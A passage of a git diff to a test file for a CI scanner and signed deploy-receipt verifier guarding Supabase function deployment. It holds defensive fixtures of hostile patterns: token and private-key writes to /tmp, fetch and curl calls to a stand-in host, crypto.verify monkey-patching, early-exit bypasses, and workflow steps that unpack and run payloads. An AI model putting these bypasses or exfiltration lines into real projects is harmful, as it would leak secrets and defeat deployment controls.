@@ -13,8 +13,10 @@ import { fileURLToPath } from "node:url";
 import {
   auditClientIpProbeContract,
   clientIpProbeTemplateViolations,
+  parseTrustedJsonWithoutDuplicateKeys,
   probeToolViolations,
   protectedDeployViolations,
+  workflowPrivilegeViolations,
 } from "./audit-client-ip-probe-contract.mjs";
 import {
   assertDisjointArtifactRoots,
@@ -24,13 +26,41 @@ import {
   expectedClientIpProbeArtifacts,
 } from "./render-client-ip-probe.mjs";
 import {
-  issueClientIpDeployReceipt,
-  signClientIpDeployReceipt,
+  buildClientIpDeployReceiptPayload,
   verifyClientIpDeployReceipt,
 } from "./verify-client-ip-deploy-receipt.mjs";
+import {
+  signClientIpDeployReceipt,
+} from "./issue-client-ip-deploy-receipt.mjs";
 
 const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
 const read = (relative) => fs.readFileSync(path.join(root, relative), "utf8");
+const trustedManifest = parseTrustedJsonWithoutDuplicateKeys(
+  read("scripts/client-ip-probe-audit-trusted.json"),
+  "client-IP trusted-source manifest fixture",
+).files;
+assert.throws(
+  () => parseTrustedJsonWithoutDuplicateKeys(
+    '{"manifest_version":1,"files":{"scanner":"a","scanner":"b"}}',
+    "duplicate trusted manifest fixture",
+  ),
+  /duplicate object keys/,
+);
+
+function violationsWithLocallyRefreshedDigest(relative, source) {
+  return probeToolViolations(relative, source, {
+    trustedDigests: {
+      ...trustedManifest,
+      [relative]: crypto.createHash("sha256").update(source).digest("hex"),
+    },
+  });
+}
+
+function substantiveViolationsWithLocallyRefreshedDigest(relative, source) {
+  return violationsWithLocallyRefreshedDigest(relative, source).filter(
+    (violation) => !violation.endsWith("source digest is not reviewed"),
+  );
+}
 const extractorSource = read(CLIENT_IP_EXTRACTOR_PATH);
 const probeTemplateSource = read(CLIENT_IP_PROBE_TEMPLATE_PATH);
 const SHA = "0123456789abcdef0123456789abcdef01234567";
@@ -39,7 +69,26 @@ const PROJECT_REF = "hdcflshhomzildwqlmwh";
 const PROBE_ID = "11111111-2222-4333-8aaa-555555555555";
 const PROBE_VERSION = 7;
 const DEPLOYMENT_ID = `${PROJECT_REF}_${PROBE_ID}_${PROBE_VERSION}`;
-const HMAC_KEY = "test-client-ip-receipt-hmac-key-at-least-32-bytes";
+const DISPATCH_NONCE = "utah-client-ip-dispatch-nonce-fixture-0001";
+const KEY_PAIR = crypto.generateKeyPairSync("ed25519");
+const PRIVATE_KEY_PKCS8_DER_BASE64 = KEY_PAIR.privateKey.export({
+  format: "der",
+  type: "pkcs8",
+}).toString("base64");
+const PUBLIC_KEY_SPKI_DER_BASE64 = KEY_PAIR.publicKey.export({
+  format: "der",
+  type: "spki",
+}).toString("base64");
+const TRAILING_PRIVATE_KEY_PKCS8_DER_BASE64 = Buffer.concat([
+  Buffer.from(PRIVATE_KEY_PKCS8_DER_BASE64, "base64"),
+  Buffer.from([0]),
+]).toString("base64");
+const TRAILING_PUBLIC_KEY_SPKI_DER_BASE64 = Buffer.concat([
+  Buffer.from(PUBLIC_KEY_SPKI_DER_BASE64, "base64"),
+  Buffer.from([0]),
+]).toString("base64");
+const OTHER_PUBLIC_KEY_SPKI_DER_BASE64 = crypto.generateKeyPairSync("ed25519")
+  .publicKey.export({ format: "der", type: "spki" }).toString("base64");
 const NOW = new Date();
 const EZBR_BYTES = Buffer.from("fixture-ezbr-bundle-bytes\0binary\xff", "latin1");
 const EZBR_SHA256 = crypto.createHash("sha256").update(EZBR_BYTES).digest("hex");
@@ -183,19 +232,19 @@ function buildRawArtifacts(tempRoot, now = NOW) {
   const files = {
     functionsPre: writeJson0600(
       path.join(tempRoot, "functions-pre.json"),
-      functionCapture(at(-1170), baseFunctions, null),
+      functionCapture(at(-770), baseFunctions, null),
     ),
     functionsCanary: writeJson0600(
       path.join(tempRoot, "functions-canary.json"),
-      functionCapture(at(-1100), canaryFunctions, EZBR_SHA256),
+      functionCapture(at(-700), canaryFunctions, EZBR_SHA256),
     ),
     functionsRecheck: writeJson0600(
       path.join(tempRoot, "functions-recheck.json"),
-      functionCapture(at(-900), canaryFunctions, EZBR_SHA256),
+      functionCapture(at(-500), canaryFunctions, EZBR_SHA256),
     ),
     functionsPost: writeJson0600(
       path.join(tempRoot, "functions-post.json"),
-      functionCapture(at(-840), baseFunctions, null),
+      functionCapture(at(-440), baseFunctions, null),
     ),
     ezbrCanary: write0600(
       path.join(tempRoot, "probe-canary.ezbr"),
@@ -207,36 +256,44 @@ function buildRawArtifacts(tempRoot, now = NOW) {
     ),
     secretsPre: writeJson0600(
       path.join(tempRoot, "secrets-pre.json"),
-      secretCapture(at(-1160), secrets),
+      secretCapture(at(-760), secrets),
     ),
     secretsCanary: writeJson0600(
       path.join(tempRoot, "secrets-canary.json"),
-      secretCapture(at(-1090), secrets),
+      secretCapture(at(-690), secrets),
     ),
     secretsRecheck: writeJson0600(
       path.join(tempRoot, "secrets-recheck.json"),
-      secretCapture(at(-895), secrets),
+      secretCapture(at(-495), secrets),
     ),
     secretsPost: writeJson0600(
       path.join(tempRoot, "secrets-post.json"),
-      secretCapture(at(-830), secrets),
+      secretCapture(at(-430), secrets),
     ),
     computePre: writeJson0600(
       path.join(tempRoot, "compute-pre.json"),
-      computeCapture(at(-1190), baseDroplets, null),
+      computeCapture(at(-790), baseDroplets, null),
     ),
     computeCreated: writeJson0600(
       path.join(tempRoot, "compute-created.json"),
-      computeCapture(at(-1180), [...baseDroplets, createdDroplet], "9001"),
+      computeCapture(at(-780), [...baseDroplets, createdDroplet], "9001"),
     ),
     computePost: writeJson0600(
       path.join(tempRoot, "compute-post.json"),
-      computeCapture(at(-820), baseDroplets, null),
+      computeCapture(at(-420), baseDroplets, null),
+    ),
+    finalFunctions: writeJson0600(
+      path.join(tempRoot, "final-live-functions.json"),
+      baseFunctions,
+    ),
+    finalSecrets: writeJson0600(
+      path.join(tempRoot, "final-live-secrets.json"),
+      secrets,
     ),
   };
 
   const requestPaths = {};
-  let requestOffset = -1000;
+  let requestOffset = -600;
   for (const caseId of [
     "ipv4-baseline",
     "ipv4-forged-cf",
@@ -349,9 +406,9 @@ function buildRawArtifacts(tempRoot, now = NOW) {
     {
       attestation_version: 1,
       exclusive_mutation_window: true,
-      exclusive_window_started_at: at(-1200),
-      probe_deleted_at: at(-850),
-      exclusive_window_ended_at: at(-810),
+      exclusive_window_started_at: at(-800),
+      probe_deleted_at: at(-450),
+      exclusive_window_ended_at: at(-410),
       delete_scope: "literal-slug-only",
       deletion_target: "client-ip-probe",
       probe_secret_mutation_performed: false,
@@ -362,6 +419,10 @@ function buildRawArtifacts(tempRoot, now = NOW) {
     requestPaths,
     renderRoot,
     capturedSourceRoot,
+    finalStatePaths: {
+      finalFunctionsPath: files.finalFunctions,
+      finalSecretsPath: files.finalSecrets,
+    },
     artifactPaths: {
       functions_pre_path: files.functionsPre,
       functions_canary_path: files.functionsCanary,
@@ -385,28 +446,67 @@ function buildRawArtifacts(tempRoot, now = NOW) {
 }
 
 function issue(raw) {
-  return issueClientIpDeployReceipt({
+  const built = buildClientIpDeployReceiptPayload({
+    targetFunction: "handle-lead",
+    dispatchNonce: DISPATCH_NONCE,
     deploySha: SHA,
     projectRef: PROJECT_REF,
     extractorSource,
     probeTemplateSource,
     artifactPaths: raw.artifactPaths,
-    receiptHmacKey: HMAC_KEY,
     now: NOW,
   });
+  return {
+    payload: built.payload,
+    token: signClientIpDeployReceipt(
+      built.payload,
+      PRIVATE_KEY_PKCS8_DER_BASE64,
+    ),
+  };
 }
 
-function verifyPayload(payload, now = NOW) {
+let activeFinalStatePaths;
+
+function verifyPayload(payload, now = NOW, overrides = {}) {
   return verifyClientIpDeployReceipt({
     functionName: "handle-lead",
+    dispatchNonce: DISPATCH_NONCE,
     deploySha: SHA,
     projectRef: PROJECT_REF,
     extractorSource,
     probeTemplateSource,
-    receiptToken: signClientIpDeployReceipt(payload, HMAC_KEY),
-    receiptHmacKey: HMAC_KEY,
+    receiptToken: signClientIpDeployReceipt(
+      payload,
+      PRIVATE_KEY_PKCS8_DER_BASE64,
+    ),
+    publicKeySpkiDerBase64: PUBLIC_KEY_SPKI_DER_BASE64,
+    finalFunctionsPath: overrides.finalFunctionsPath ??
+      activeFinalStatePaths?.finalFunctionsPath,
+    finalSecretsPath: overrides.finalSecretsPath ??
+      activeFinalStatePaths?.finalSecretsPath,
     now,
+    ...overrides,
   });
+}
+
+function signRawPayloadText(payloadText) {
+  const encodedPayload = Buffer.from(payloadText, "utf8").toString("base64url");
+  const signature = crypto.sign(
+    null,
+    Buffer.from(encodedPayload, "utf8"),
+    KEY_PAIR.privateKey,
+  ).toString("base64url");
+  return `${encodedPayload}.${signature}`;
+}
+
+function mutateRawFile(filePath, mutate, assertion) {
+  const original = fs.readFileSync(filePath);
+  write0600(filePath, mutate(original.toString("utf8")));
+  try {
+    assertion();
+  } finally {
+    write0600(filePath, original);
+  }
 }
 
 function withJsonMutation(filePath, mutate, assertion) {
@@ -466,24 +566,26 @@ for (const [relative, source] of [
   [".github/workflows/docker-cli.yml", "run: docker run supabase/cli:2.113.0 functions deploy handle-lead --project-ref hdcflshhomzildwqlmwh"],
   ["ops/reversed-command.txt", 'const command=["deploy","functions","supabase"].reverse().join(" "); const slug=["probe","ip","client"].reverse().join("-")'],
 ]) {
-  const violations = auditClientIpProbeContract({
-    trackedSources: new Map([[relative, source]]),
-    templateSource: probeTemplateSource,
+  const violations = probeToolViolations(relative, source, {
+    fileMode: "100644",
   });
-  assert.notEqual(violations.length, 0, `${relative} evaded repo-wide scanner`);
+  assert(
+    violations.some((violation) => violation.includes(relative)),
+    `${relative} evaded its direct repo-wide scanner rule`,
+  );
 }
 for (const source of [
   'CLI=supabase; "$CLI" functions deploy handle-lead --project-ref hdcflshhomzildwqlmwh',
   'A=supa; B=base; "$A$B" functions deploy handle-lead --project-ref hdcflshhomzildwqlmwh',
   "docker run supabase/cli:2.113.0 functions deploy lead-crm --project-ref hdcflshhomzildwqlmwh",
 ]) {
-  const violations = auditClientIpProbeContract({
-    trackedSources: new Map([
-      ["scripts/unsafe.sh", source],
-      [".github/workflows/invoke-unsafe.yml", "run: bash scripts/unsafe.sh"],
-    ]),
-    templateSource: probeTemplateSource,
-  });
+  const violations = [
+    ...probeToolViolations("scripts/unsafe.sh", source, { fileMode: "100644" }),
+    ...workflowPrivilegeViolations(
+      ".github/workflows/invoke-unsafe.yml",
+      "run: bash scripts/unsafe.sh",
+    ),
+  ];
   assert.notEqual(
     violations.length,
     0,
@@ -491,10 +593,7 @@ for (const source of [
   );
 }
 assert.notEqual(
-  auditClientIpProbeContract({
-    trackedSources: new Map([["ops/unsafe.mjs", null]]),
-    templateSource: probeTemplateSource,
-  }).length,
+  probeToolViolations("ops/unsafe.mjs", null, { fileMode: "100644" }).length,
   0,
   "binary executable/config evaded scanner",
 );
@@ -514,15 +613,142 @@ assert.notEqual(
   0,
   "tracked executable binary mode evaded scanner",
 );
+for (const relative of [
+  "vendor/runner.bin",
+  "vendor/runner.jar",
+  "vendor/runner.wasm",
+  "cache/runner.pyc",
+  "cache/runner.pyo",
+  "vendor/Runner.class",
+  "vendor/runner.dll",
+  "vendor/runner.dylib",
+  "vendor/runner.so",
+  "vendor/runner.exe",
+  "vendor/runner.com",
+]) {
+  assert.notEqual(
+    probeToolViolations(relative, "opaque-fixture", { fileMode: "100644" }).length,
+    0,
+    `${relative} 0644 opaque executable evaded scanner`,
+  );
+  assert.notEqual(
+    workflowPrivilegeViolations(
+      ".github/workflows/invoke-opaque.yml",
+      `jobs:\n  invoke:\n    runs-on: ubuntu-latest\n    steps:\n      - run: node ${relative}`,
+    ).length,
+    0,
+    `${relative} workflow invocation evaded scanner`,
+  );
+}
+assert.deepEqual(
+  probeToolViolations("public/project-photo.webp", null, {
+    fileMode: "100644",
+    fileDigest: "a".repeat(64),
+    fileHeaderHex: "52494646000000005745425056503820",
+  }),
+  [],
+  "ordinary media must remain permitted",
+);
+for (const [relative, fileHeaderHex] of [
+  ["assets/disguised-executable.png", "7f454c4602010100"],
+  ["assets/disguised-pe.jpg", "4d5a900003000000"],
+  ["assets/disguised-wasm.webp", "0061736d01000000"],
+  ["tools/ship", "7f454c4602010100"],
+  ["vendor/addon.node", "7f454c4602010100"],
+  ["vendor/mobile.apk", "504b030400000000"],
+  ["vendor/image.elf", "7f454c4602010100"],
+]) {
+  assert.notEqual(
+    probeToolViolations(relative, null, {
+      fileMode: "100644",
+      fileDigest: "b".repeat(64),
+      fileHeaderHex,
+    }).length,
+    0,
+    `${relative} executable/opaque artifact escaped magic and extension checks`,
+  );
+}
+for (const [relative, source, fileHeaderHex] of [
+  ["assets/nul-free-elf.png", "\u007fELFAAAA", "7f454c4641414141"],
+  ["assets/nul-free-pe.jpg", "MZAAAA", "4d5a41414141"],
+  ["assets/nul-free-mach-o.webp", "opaque", "cffaedfe41414141"],
+  ["assets/ascii-not-an-image.png", "not-an-image", "6e6f742d616e2d696d616765"],
+]) {
+  assert.notEqual(
+    probeToolViolations(relative, source, {
+      fileMode: "100644",
+      fileDigest: "d".repeat(64),
+      fileHeaderHex,
+    }).length,
+    0,
+    `${relative} NUL-free executable/invalid-media bytes escaped classification`,
+  );
+}
+assert.deepEqual(
+  probeToolViolations("scripts/transparent-benign.sh", "#!/bin/sh\necho hi\n", {
+    fileMode: "100644",
+    fileDigest: "e".repeat(64),
+    fileHeaderHex: "23212f62696e2f7368",
+  }),
+  [],
+  "transparent reviewed shebang text must remain scannable rather than opaque",
+);
+for (const relative of [
+  ".DS_Store",
+  "images/brand-source/01 New Primary Logo/02 Frame Restoration/ai svg/new FR logo - white words-.afdesign~lock~",
+]) {
+  const source = "print qq(pwn);";
+  assert.notEqual(
+    probeToolViolations(relative, source, {
+      fileMode: "100644",
+      fileDigest: "0".repeat(64),
+      fileHeaderHex: Buffer.from(source).toString("hex"),
+    }).length,
+    0,
+    `${relative} NUL-free replacement bypassed its exact opaque-asset allowlist`,
+  );
+}
+assert.notEqual(
+  probeToolViolations("assets/manual.docx", null, {
+    fileMode: "100644",
+    fileDigest: "c".repeat(64),
+    fileHeaderHex: null,
+  }).length,
+  0,
+  "opaque office document without inspected magic failed open",
+);
+assert.deepEqual(
+  probeToolViolations("assets/manual.docx", null, {
+    fileMode: "100644",
+    fileDigest: "c".repeat(64),
+    fileHeaderHex: "504b0304140000000800000000000000",
+  }),
+  [],
+  "ordinary office documents must remain permitted as inert assets",
+);
+for (const source of [
+  "jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: unzip assets/manual.docx\n      - run: bash payload.sh",
+  "jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: chmod +x tools/ship && ./tools/ship",
+  "jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: tar -xf payload.zip && bash payload.sh",
+  "jobs:\n  run:\n    runs-on: ubuntu-latest\n    env:\n      FILE: assets/manual.docx\n    steps:\n      - run: cp \"$FILE\" /tmp/payload\n      - run: unzip /tmp/payload\n      - run: bash payload.sh",
+  `jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: attacker/archive-action@${"a".repeat(40)}\n        with:\n          args: unzip archive/frame-restoration-utah-deploy.zip`,
+  "jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - shell: java -jar assets/manual.docx {0}\n        run: echo hi",
+  "jobs:\n  run:\n    runs-on: ubuntu-latest\n    steps:\n      - run: perl .DS_Store",
+]) {
+  assert.notEqual(
+    workflowPrivilegeViolations(".github/workflows/opaque.yml", source).length,
+    0,
+    "opaque asset extraction/invocation escaped workflow gate",
+  );
+}
 const untrustedPath = "ops/client-ip-probe-trusted-smuggle.mjs";
 const untrustedSource = "Deno.connect({hostname:'x',port:1})";
 const untrustedDigest = crypto.createHash("sha256")
   .update(untrustedSource).digest("hex");
 assert.notEqual(
-  auditClientIpProbeContract({
-    trackedSources: new Map([[untrustedPath, untrustedSource]]),
-    templateSource: probeTemplateSource,
+  probeToolViolations(untrustedPath, untrustedSource, {
     trustedDigests: { [untrustedPath]: untrustedDigest },
+    fileMode: "100644",
   }).length,
   0,
   "arbitrary path entered the trusted-source allowlist",
@@ -549,19 +775,28 @@ for (const fixture of [
 
 const deployWorkflowSource = read(".github/workflows/deploy-edge-function.yml");
 assert.deepEqual(
-  probeToolViolations(".github/workflows/deploy-edge-function.yml", deployWorkflowSource),
+  probeToolViolations(
+    ".github/workflows/deploy-edge-function.yml",
+    deployWorkflowSource,
+    { trustedDigests: trustedManifest },
+  ),
   [],
 );
 for (const [label, source] of [
   ["job if", deployWorkflowSource.replace("    runs-on: ubuntu-latest", "    if: true\n    runs-on: ubuntu-latest")],
+  ["quoted job if", deployWorkflowSource.replace("    runs-on: ubuntu-latest", '    "if": true\n    runs-on: ubuntu-latest')],
   ["continue on error", deployWorkflowSource.replace("    runs-on: ubuntu-latest", "    continue-on-error: true\n    runs-on: ubuntu-latest")],
-  ["npm indirection", deployWorkflowSource.replace("run: node scripts/verify-client-ip-deploy-receipt.mjs", "run: npm run test:client-ip-receipt")],
+  ["quoted continue on error", deployWorkflowSource.replace("    runs-on: ubuntu-latest", '    "continue-on-error": true\n    runs-on: ubuntu-latest')],
+  ["npm indirection", deployWorkflowSource.replace("          node scripts/verify-client-ip-deploy-receipt.mjs", "          npm run test:client-ip-receipt")],
   ["flags before protected", deployWorkflowSource.replace('supabase functions deploy "${{ inputs.function }}"', "supabase functions deploy --project-ref hdcflshhomzildwqlmwh handle-lead")],
   ["deploy all", deployWorkflowSource.replace('supabase functions deploy "${{ inputs.function }}"', "supabase functions deploy --project-ref hdcflshhomzildwqlmwh")],
   ["assembled extra deploy", `${deployWorkflowSource}\n# ["supabase","functions","deploy"].join(" ")`],
   ["assembled network", `${deployWorkflowSource}\n# ["Deno","connect"].join(".")`],
   ["probe choice", deployWorkflowSource.replace("          - handle-lead", "          - client-ip-probe\n          - handle-lead")],
-  ["project swap", deployWorkflowSource.replace("--project-ref hdcflshhomzildwqlmwh", "--project-ref attackerprojectref")],
+  ["project swap", deployWorkflowSource.replace(
+    "SUPABASE_PROJECT_REF: hdcflshhomzildwqlmwh",
+    "SUPABASE_PROJECT_REF: attackerprojectref",
+  )],
   ["checkout ref swap", deployWorkflowSource.replace("ref: ${{ github.sha }}", "ref: refs/heads/attacker")],
   ["node options", `${deployWorkflowSource}\nenv:\n  NODE_OPTIONS: --require ./scripts/exit-zero.cjs`],
   ["node path", `${deployWorkflowSource}\nenv:\n  NODE_PATH: ./scripts`],
@@ -569,9 +804,21 @@ for (const [label, source] of [
   ["custom shell", deployWorkflowSource.replace("    runs-on: ubuntu-latest", "    runs-on: ubuntu-latest\n    defaults:\n      run:\n        shell: bash {0} || true")],
   ["working directory", deployWorkflowSource.replace("    runs-on: ubuntu-latest", "    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: scripts")],
   ["secret set", `${deployWorkflowSource}\n# supabase secrets set CLIENT_IP_PROBE_SECRET=x`],
+  ["mutable checkout action", deployWorkflowSource.replace(
+    "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
+    "actions/checkout@v4",
+  )],
+  ["mutable setup-cli action", deployWorkflowSource.replace(
+    "supabase/setup-cli@ab058987d8d6c725971f6cf9d0b5c98467e30bd1",
+    "supabase/setup-cli@v1",
+  )],
 ]) {
   assert.notEqual(
-    probeToolViolations(".github/workflows/deploy-edge-function.yml", source).length,
+    probeToolViolations(
+      ".github/workflows/deploy-edge-function.yml",
+      source,
+      { trustedDigests: trustedManifest },
+    ).length,
     0,
     `${label} workflow bypass passed scanner`,
   );
@@ -584,7 +831,11 @@ assert.notEqual(
 
 const complianceSource = read(".github/workflows/compliance-gate.yml");
 assert.deepEqual(
-  probeToolViolations(".github/workflows/compliance-gate.yml", complianceSource),
+  probeToolViolations(
+    ".github/workflows/compliance-gate.yml",
+    complianceSource,
+    { trustedDigests: trustedManifest },
+  ),
   [],
 );
 for (const source of [
@@ -593,23 +844,326 @@ for (const source of [
   complianceSource.replace("run: node scripts/audit-client-ip-probe-contract.mjs", "run: npm run audit:client-ip-probe"),
   complianceSource.replace("      - '**'\n", ""),
   `${complianceSource}\n# ["supabase","functions","deploy"].join(" ")`,
-  complianceSource.replace("      - uses: actions/checkout@v4", "      - uses: actions/checkout@v4\n        with:\n          ref: refs/heads/attacker"),
+  complianceSource.replace(
+    "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
+    "      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262\n        with:\n          ref: refs/heads/attacker",
+  ),
   `${complianceSource}\nenv:\n  NODE_OPTIONS: --require ./scripts/exit-zero.cjs`,
   `${complianceSource}\nenv:\n  NODE_PATH: ./scripts`,
   `${complianceSource}\ndefaults:\n  run:\n    shell: bash {0} || true`,
   complianceSource.replace("    runs-on: ubuntu-latest", "    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: scripts"),
+  complianceSource.replace(
+    "actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020",
+    "actions/setup-node@v4",
+  ),
 ]) {
   assert.notEqual(
-    probeToolViolations(".github/workflows/compliance-gate.yml", source).length,
+    probeToolViolations(
+      ".github/workflows/compliance-gate.yml",
+      source,
+      { trustedDigests: trustedManifest },
+    ).length,
     0,
     "compliance workflow bypass passed scanner",
   );
 }
 
-let validPayload;
-const tempRoot = fs.mkdtempSync(path.join(os.tmpdir(), "ut-client-ip-v2-hardening-"));
+const verifierSource = read("scripts/verify-client-ip-deploy-receipt.mjs");
+const issuerSource = read("scripts/issue-client-ip-deploy-receipt.mjs");
+const rendererSource = read("scripts/render-client-ip-probe.mjs");
+const scannerSource = read("scripts/audit-client-ip-probe-contract.mjs");
+const clientTestSource = read("scripts/test-client-ip-deploy-receipt.mjs");
+const ownerTestSource = read("scripts/test-owner-notification-deploy-receipt.mjs");
+const scannerImports = [...scannerSource.matchAll(
+  /^import[\s\S]*?from\s+["']([^"']+)["'];?$/gm,
+)].map((match) => match[1]);
+assert(
+  scannerImports.length > 0 && scannerImports.every((specifier) =>
+    specifier.startsWith("node:")
+  ),
+  "scanner trust root must not execute repository-controlled imports",
+);
+for (const [label, relative, source] of [
+  [
+    "verifier early-success bypass",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    `${verifierSource}\nprocess.exit(0);`,
+  ],
+  [
+    "verifier outer early return",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    verifierSource.replace(
+      "  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+      "  return { required: true };\n  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+    ),
+  ],
+  [
+    "signed parser early decoded-payload return",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    verifierSource.replace(
+      "function parseSignedReceipt(token, publicKeySpkiDerBase64) {",
+      'function parseSignedReceipt(token, publicKeySpkiDerBase64) {\n  const [payload] = token.split(".");\n  return JSON.parse(Buffer.from(payload, "base64url"));',
+    ),
+  ],
+  [
+    "signed parser crypto monkey patch",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    verifierSource.replace(
+      "function parseSignedReceipt(token, publicKeySpkiDerBase64) {",
+      "function parseSignedReceipt(token, publicKeySpkiDerBase64) {\n  crypto.verify = () => true;",
+    ),
+  ],
+  [
+    "verifier alias error exfiltration",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    verifierSource.replace(
+      "  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+      "  const leaked = receiptToken;\n  if (leaked) throw new Error(leaked);\n  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+    ),
+  ],
+  [
+    "verifier filesystem exfiltration",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    verifierSource.replace(
+      "  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+      "  fs.writeFileSync('/tmp/client-ip-token', receiptToken);\n  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+    ),
+  ],
+  [
+    "verifier constructed-argument console exfiltration",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    verifierSource.replace(
+      "}) {\n  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+      '}) {\n  const keyParts = ["receipt", "Token"];\n  const sensitiveValue = arguments[0][keyParts.join("")];\n  console.debug(sensitiveValue);\n  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };',
+    ),
+  ],
+  [
+    "verifier low-level filesystem exfiltration",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    verifierSource.replace(
+      "  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+      "  const outputDescriptor = fs.openSync('/tmp/client-ip-token', 'w');\n  fs.writeSync(outputDescriptor, receiptToken);\n  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+    ),
+  ],
+  [
+    "verifier escaped built-in import exfiltration",
+    "scripts/verify-client-ip-deploy-receipt.mjs",
+    verifierSource.replace(
+      'import crypto from "node:crypto";',
+      'import { writeFileSync as sink } from "node:\\u0066s";\nimport proc from "node:proce\\u0073s";\nimport crypto from "node:crypto";',
+    ).replace(
+      "  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };",
+      '  const secretName = ["CLIENT", "IP", "DEPLOY", "RECEIPT", "TOKEN"].join("_");\n  sink("/tmp/receipt-copy", proc.env[secretName]);\n  if (!PROTECTED_FUNCTIONS.has(functionName)) return { required: false };',
+    ),
+  ],
+  [
+    "issuer outbound network capability",
+    "scripts/issue-client-ip-deploy-receipt.mjs",
+    `${issuerSource}\n${
+      ["fet", "ch"].join("")
+    }("https://example.invalid");`,
+  ],
+  [
+    "issuer alias error exfiltration",
+    "scripts/issue-client-ip-deploy-receipt.mjs",
+    issuerSource.replace(
+      "  let privateKey;",
+      "  const leaked = privateKeyPkcs8DerBase64;\n  if (leaked) throw new Error(leaked);\n  let privateKey;",
+    ),
+  ],
+  [
+    "issuer filesystem key exfiltration",
+    "scripts/issue-client-ip-deploy-receipt.mjs",
+    issuerSource.replace(
+      "  let privateKey;",
+      "  fs.writeFileSync('/tmp/client-ip-private-key', privateKeyPkcs8DerBase64);\n  let privateKey;",
+    ),
+  ],
+  [
+    "issuer escaped built-in import exfiltration",
+    "scripts/issue-client-ip-deploy-receipt.mjs",
+    issuerSource.replace(
+      'import crypto from "node:crypto";',
+      'import { writeFileSync as sink } from "node:\\u0066s";\nimport proc from "node:proce\\u0073s";\nimport crypto from "node:crypto";',
+    ).replace(
+      "  try {\n    const payload = buildClientIpDeployReceiptPayload({",
+      '  try {\n    const secretName = ["CLIENT", "IP", "DEPLOY", "RECEIPT", "PRIVATE", "KEY", "PKCS8", "DER", "BASE64"].join("_");\n    sink("/tmp/private-key-copy", proc.env[secretName]);\n    const payload = buildClientIpDeployReceiptPayload({',
+    ),
+  ],
+  [
+    "issuer constructed-argument console exfiltration",
+    "scripts/issue-client-ip-deploy-receipt.mjs",
+    issuerSource.replace(
+      "export function signClientIpDeployReceipt(payload, privateKeyPkcs8DerBase64) {",
+      "export function signClientIpDeployReceipt(payload, privateKeyPkcs8DerBase64) {\n  console.debug(arguments[1]);",
+    ),
+  ],
+  [
+    "renderer ambient environment access",
+    "scripts/render-client-ip-probe.mjs",
+    `${rendererSource}\n${
+      ["process", "env", "EXTRA_SECRET"].join(".")
+    };`,
+  ],
+  [
+    "renderer top-level early success",
+    "scripts/render-client-ip-probe.mjs",
+    `${rendererSource}\nprocess.exit(0);`,
+  ],
+  [
+    "renderer raw source output",
+    "scripts/render-client-ip-probe.mjs",
+    rendererSource.replace(
+      "        target_source_sha: expected.targetSourceSha,",
+      "        target_source_sha: expected.targetSourceSha,\n        raw_source: extractorSource,",
+    ),
+  ],
+  [
+    "extractor logging capability",
+    "supabase/functions/_shared/client-ip.ts",
+    `${extractorSource}\nconsole.log("raw identity");`,
+  ],
+  [
+    "scanner inventory bypass",
+    "scripts/audit-client-ip-probe-contract.mjs",
+    scannerSource.replace(
+      'const result = spawnSync("git", ["ls-files", "-s", "-z"]',
+      'const result = spawnSync("git", ["status"]',
+    ),
+  ],
+  [
+    "scanner filesystem self-mutation",
+    "scripts/audit-client-ip-probe-contract.mjs",
+    `${scannerSource}\nfs.writeFileSync("supabase/functions/handle-lead/index.ts", "bypass");`,
+  ],
+  [
+    "client receipt test early success",
+    "scripts/test-client-ip-deploy-receipt.mjs",
+    `${clientTestSource}\nprocess.exit(0);`,
+  ],
+  [
+    "client receipt test network subprocess",
+    "scripts/test-client-ip-deploy-receipt.mjs",
+    `${clientTestSource}\nspawnSync("bash", ["-c", "curl https://example.invalid"]);`,
+  ],
+  [
+    "client receipt test dynamic subprocess alias",
+    "scripts/test-client-ip-deploy-receipt.mjs",
+    `${clientTestSource}\nconst offlineRunner = ${
+      ["ev", "al"].join("")
+    }(["spawn", "Sync"].join("")); offlineRunner("bash", ["-c", "curl https://example.invalid"]);`,
+  ],
+  [
+    "owner receipt dependency early success",
+    "scripts/test-owner-notification-deploy-receipt.mjs",
+    `${ownerTestSource}\nprocess.exit(0);`,
+  ],
+  [
+    "runbook symmetric client receipt regression",
+    "supabase/functions/handle-lead/DEPLOY.md",
+    `${read("supabase/functions/handle-lead/DEPLOY.md")}\nCLIENT_IP_DEPLOY_RECEIPT_HMAC_KEY`,
+  ],
+  [
+    "deploy workflow mutable action",
+    ".github/workflows/deploy-edge-function.yml",
+    deployWorkflowSource.replace(
+      "actions/checkout@11d5960a326750d5838078e36cf38b85af677262",
+      "actions/checkout@v4",
+    ),
+  ],
+  [
+    "deploy workflow quoted condition",
+    ".github/workflows/deploy-edge-function.yml",
+    deployWorkflowSource.replace(
+      "    needs: admission",
